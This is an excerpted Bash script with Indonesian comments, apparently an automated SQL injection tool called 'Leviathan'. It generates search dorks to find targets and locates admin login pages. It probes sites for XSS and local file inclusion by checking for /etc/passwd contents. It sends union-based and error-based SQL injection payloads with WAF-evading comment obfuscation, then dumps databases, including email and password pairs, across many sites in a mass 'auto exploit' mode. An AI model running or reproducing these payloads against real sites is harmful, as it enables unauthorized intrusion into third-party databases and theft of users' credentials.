...
#output ressult
injected_site="injected.txt" #Result history site yang injected dri pertama kali psqli di gunakan
...
email_site="empass-site.txt" #site yang berisikan email pass
error_site="error.txt" #site yang tidak bisa di inject
dork_result="dork.txt" #hasil dari dork generator
result_admin="login-site.txt" #login page hasil admin finder
#input
union_select="union.txt" #berisikan union style yang bisa kamu edit sesukamu
...
#jika mau ganti dios table dn column ganti dengan ($table = untuk table) ($column = untuk column)
...
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e" #jika mau diganti alert nya beri tulisan "Leviathan"
...
banner() {
  echo -e "    
              ...
              ${N}SQl-i${N}
           ${R}#${N}#${N}
            ${O}LeviathanPerfectHunter${O}${O}${N} 
...
then
  ...
  do
    ngecurll=$(curl -D - -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site3" | tr -d '\0' | sed 's/\r$//')
   if echo "$ngecurll" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurll" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurll" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                ...
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo -e "site3: $site3\n$ngecurll" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
...
for admin in $(cat $panel_admin | sed 's/\r$//' | tr -d "\0")
  do
    ngecurll=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
    if echo "$ngecurll" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurll" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurll" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                ...
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo "$ngecurll" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
        ...
        do
          ...
          then
              ...
              then
                 ...
                 then
                    column=$(echo "$co" | sed 's/,/,0x3a3a,/g')
                    echo "$cor $column"
                    if [[ "$waff"  = "on" ]];then 
                       dump="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000CONCAT*//**8**/($column)+AS+CHAR),0x7e))+/*!50000FROM*/+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
                    else
                       dump="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT($column)+AS+CHAR),0x7e))+FROM+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
                    fi
                    echo -e "${O}\033[2mpastikan nama yang dimasukan sudah sesuai${N}"
                       ...
                       then
                          if [ -f .output ];then
                             ...
                             *) echo -en "\n${O}skip to next site${N}";;
                             ...
                             echo -e "KOSONG\n${N}+$coi+"
                             echo -e "${R}\033[2mF A I L E D try dump dios manual$N\n\033[2mpastikan input yang dimasukan sudah benar atau periksa koneksi\njika input sudah benar kemungkinan columnn yang di tuju kosong${N}"
                             echo -n -e "${N}${G}1.${N} Dump lagi\n${N}${G}2.${N} kembali ke database awal${N}${G}\n3.${N} kembali kemenu utama"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}biarkan kosong lalu tekan ENTER skip to next site${N}"
                             fi
     ...
     then
        ...
        then
         ...
         do 
            ...
            cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
            column=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
            if [[ "$debug" = "y" ]];then
               echo -e "$site$getdb\n\n$table::$column"
            fi
            if [ "$column" = "" ]
...
gen() {
  echo -e "                |\033[7;32m Dork generator by Leviathan ${N}|\n\n${O}cth: product cart buy${N}"
  echo -n "Masukan Keyword: "
  read key
  echo -e "${O}cth: .php .html .aspx${N}"
  read -p "Masukan Format : " mat
  echo -e "${O}berapa dork yang ingin di hasilkan max 800${N}"
         ...
         for b in $(echo "$b")
           do
             ...
             then
                ...
                then
                  sp="/-|"
                  #b = site hasil dork dan jika dorking single site dan dorking dork itu berbeda
...
#logika perhitngan single site bukan all dork
dorkscan() {
  true_lfi="n"
  dir=$(echo "$b" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  mkdir -p output/$dir
  for admin in `echo "$admin_dork" | tr -d '\0' | sed 's/\r$//'`
   ...
   if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -sL --max-time $time_out "$b$xss_payload" | grep -Po "Leviathan" | tr -d '\0' | sed 's/\r$//' >/dev/null
   then
   ...
   for hitung in $(seq $lfi_count)
    do
      ...
      ngecurll=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$b2=$lfi$lfi_payload")
      if [[ "$debug" = "y" ]];then
         echo "$b2=$lfi$lfi_payload"
      fi
      if echo "$ngecurll" | grep -P "root:|daemon:|bin:|sys:" >/dev/null
         then
            true_lfi="y"
            mkdir -p output/$dir
...
info() {
  #echo -e "$by \n $waff"
   ...
   echo -e "$angka" |  sed 's/Leviathan//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
   then
      if echo $ngecurl | grep -Po "where clause" >/dev/null
      then
        df=$(echo $ngecurl | grep -Po "Leviathan[0-9]*" | sed 's/Leviathan//g')
        ids=$(echo "$site$union$column--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'Leviathan[0-9]*' > .angka
        cat .angka |  sed 's/Leviathan//g' > .angka
      fi
    if [[ "$based64" = "y" ]]
    then
       its=$(echo -e "$column-- -" | sed 's/0x6b65646a6177336e3//g')
    else
       its=$(echo -e "$column--+" | sed 's/0x6b65646a6177336e3//g')
    fi
    ...
    ff=$(cat .db)
            ...
            then
              ...
              if  [[ "$db_ro" = "" ]]
              then
                 echo -e "${N}\033[2mDatabase yang dimasukan kosong langsung dios${N}"
                 dump_sqli="n"
                 hex="database/**8**/()"
   ...
   do
    ...
    then
       ...
       info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base94" | grep -a -o "Leviathan&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Leviathan/d' | tr -d '\0' | sed 's/\r$//')
    else #php
       if [[ "$html" = "y" ]]
       then
          if [[ "$corona" = "y" ]];then
       ...
       then
          dk=$(echo -e "$union$db")
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -a -o "Leviathan&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Leviathan/d' | tr -d '\0' | sed 's/\r$//')
       else
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$dk" | grep -a -o "Leviathan&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Leviathan/d' | tr -d '\0' | sed 's/\r$//')
       fi
...
dios() {
  ...
  if cat .angka >/dev/null
  then
    if echo $ngecurl | grep -Po "Unknown column 'Leviathan[0-9]*'" >/dev/null
    then
        df=$(echo $ngecurl | grep -Po "Leviathan[0-9]*" | sed 's/Leviathan//g')
        ids=$(echo "$site$union$column--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'Leviathan[0-9]*' > .angka
  ...
  if [[ "$based64" = "y" ]]
  then
     i2=$(echo -e "$column-- -" | sed 's/0x6b65646a6177336e3//g')
  else
     i2=$(echo -e "$column--+" | sed 's/0x6b65646a6177336e3//g')
  fi
  if [[ "$i" = `cat .angka | sort -r` ]];then
...
for i in $(seq $order_start $order_by)
  do
    ...
    column=$(echo -e "0x6b65646a6177336e3"$(seq -s ",0x6b65646a6177336e3" 1 ${i}))
    #column=$(seq -s ",0x6b65646a6177336e3" ${i})
    if [[ "$based64" = "y" ]]
    then
      st=$(echo "`cut -d "=" -f1 <<< $site`=" )
      bs4=$(echo "null$union$column-- -" | tr -d "+" | base64 -i)
      base64=$(echo "$st$bs4" | tr -d "\n")
      ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$base64" | tr -d '\0' | sed 's/\r$//' | sed 's/\r$//')
      if [[ "$debug" = "y" ]];then
         echo -e "$i\n$base64"
      fi
    else
      if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null
        then
          ...
          m1=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           ...
           ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$param1$union$column--+$param2" -L | tr -d '\0' | sed 's/\r$//')
         else
           if [[ "$postd" = "y" ]]; then
              ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sX POST  "$site" -L --data "$postnya=null$union$column--+" | tr -d '\0' | sed 's/\r$//')
           else
              ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$site$union$column--+" -L | tr -d '\0' | sed 's/\r$//')
           fi
        fi
   fi
   if [[ "$debug" = "y" ]];then #test
      if [[ "$html" = "y" ]];then
        echo "$param1$union$column--+$param2" #test
        echo -e "$param1$union$column--+$param2" | sed 's/0x6b65646a6177336e3//g' #test
      else
        echo "$ngecurl" > sample
        echo -e "$ngecurl\n Query: $site$union$column--+"
      fi
   fi
   if [ $? -eq 0 ]
    then
    if echo -e "$ngecurl" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then
       waff="on"
    ...
    if echo "$ngecurl" | grep -Po "Leviathan3|Leviathan[0-9]*" > .angka
      then
      if echo "$column" | grep -Po "," >/dev/null
         then
          corona="n"
        else
          corona="y"
       ...
       mkdir -p output/$dir
       echo -e -n "\a\n\x1b[0m${N}[${G}\033[2m`date +%T`${N}] order by yang di dapat ${i} column"
       ...
       if [[ "$based64" = "y" ]]
         then
          ...
          echo -e "${O}angka yang di tampilkan:$G $angka$N\n" | sed 's/Leviathan//g'
       else
          if [[ "$html" = "y" ]]
          then
             echo -e "\nQuery $param1$union$column--+$param2" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
             echo -e "$param1$union$column--+$param2" >> .case1
             echo -e "Query: $param1$union$column--+$param2" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
             echo -e "Query: ${N}\033[2m$param1$union$column--+$param2" | sed 's/0x6b65646a6177336e3//g'
             echo -e "${O}angka yang di tampilkan:$G $angka$N\n" | sed 's/Leviathan//g'
          else
             if [[ "$postd" = "y" ]]
             then
                 echo -e "\nQuery $postnya=null$union$column--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 echo -e "Query: $postnya=null$union$column--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query: ${N}\033[2m$postnya=null$union$column--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}angka yang di tampilkan:$G $angka$N\n" | sed 's/Leviathan//g'
             else
                 echo -e "$site$union$column--+" >> .case1
                 echo -e "\nQuery $site$union$column--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 echo -e "Query: $site$union$column--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query:${O}${N}\033[2m $site$union$column--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}angka yang di tampilkan:$G $angka$N\n" | sed 's/Leviathan//g'
             fi
          fi
        fi
...
[${O}3${N}]. Auto Dorking + Auto Exploit
[${O}4${N}]. SQLi Base64 injection
[${O}5${N}]. SQLi POST method
[${O}6${N}]. SQLi Error Base Method
...
case $d in
 ...
 2) masn="y"
  ...
  3) masn="y"
     ...
     clear
     banner
     echo -e "              |\033[7;32m Auto Dorking + Auto Exploit ${N}|\n"
      ...
      case $d in
       1) masn="y"
        ...
        2) masn="y"
          ...
          clear
          banner
          echo -e "              |\033[7;32m Mass Auto Dorking + Auto Exploit ${N}|\n"
  ...
  5) masn="n"
   ...
   6) clear
     ...
     case $d in
      ...
      2) clear
        ...
        masn="y"
        waff="n"
        echo -e "                |\033[7;32m ERROR BASED INJECTION + Auto Exploit masal $N|\n"
   ...
   7) clear
     banner
     echo -e "                |\033[7;32m scan site + Auto Exploit $N|\n"
     ...
     case $d in
      ...
      2) clear
        ...
        masn="y"
        waff="n"
        echo -e "                |\033[7;32m scan site + Auto Exploit masal $N|\n"
        read -p 'site list: ' file
   ...
   9) clear
      ...
      case $p in
        1) clear
           banner
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan query sqli yang sudah di dump email passs: " line
           email
           menu
           ;;
        2) clear
           banner
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan list file query sqli yang sudah di dump email passs: " file
